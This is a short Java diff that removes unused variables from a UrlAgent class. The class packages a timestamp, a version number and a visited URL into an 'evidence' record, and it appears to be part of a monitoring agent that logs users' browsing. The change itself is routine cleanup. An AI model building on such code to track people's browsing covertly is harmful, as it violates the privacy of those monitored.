@@ -177,16 +177,11 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         DateTime  datetime = new DateTime(date);
         
         int version = 0x20100713;
-        String browserType = "Browser";
-        String windowTitle = "Browser";
-
         final Vector items = new Vector();
         
         items.addElement(datetime.getStructTm());
         items.addElement(Utils.intToByteArray(version));
         items.addElement(WChar.getBytes(url, true));
-        //items.addElement(WChar.getBytes(browserType, true));
-        //items.addElement(WChar.getBytes(windowTitle, true));
         items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
 
         evidence.createEvidence(null);
